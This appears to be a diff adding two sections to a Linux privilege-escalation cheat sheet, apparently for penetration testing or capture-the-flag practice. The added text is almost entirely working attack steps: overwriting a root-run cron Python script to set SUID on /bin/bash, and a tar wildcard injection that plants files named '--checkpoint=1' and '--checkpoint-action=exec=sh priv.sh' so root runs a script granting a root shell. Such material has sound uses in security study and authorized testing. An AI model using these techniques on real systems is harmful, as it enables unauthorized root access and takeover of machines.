@@ -180,6 +180,57 @@ sudo crontab -l
 echo "chmod +s /bin/bash" >> script.sh
 ```
 
+### Privilege Escalation via Root Executable Python Script Overwrite
+```bash
+cat /etc/crontab
+```
+
+-> Output like this
+```bash
+* * * * * root /var/www/html/file.py
+```
+
+-> Modify file
+```bash
+cd /var/www/html/
+vi file.py
+```
+
+-> Import lib
+```bash
+import os
+os.system("chmod +s /bin/bash")
+```
+
+### Privilege Escalation via Tar Bash Script (WildCards)
+-> Listing "/etc/crontab" file
+```bash
+* * * * * root /usr/bin/local/file.sh
+```
+
+-> Output
+```
+#!/bin/bash
+
+cd /var/www/html/
+tar czf /tmp/file2.tar.gz *
+```
+
+-> Exploit
+```
+cd /var/www/html/
+
+echo "#!/bin/bash" > priv.sh
+echo "chmod +s /bin/bash" >> priv.sh
+chmod +x priv.sh
+```
+```
+touch /var/www/html/--checkpoint=1
+touch /var/www/html/--checkpoint-action=exec=sh\ priv.sh
+```
+
+- https://github.com/gurkylee/Linux-Privilege-Escalation-Basics
+
 ### SUID [PrivEsc]
 -> Enumeration 
 ```bash
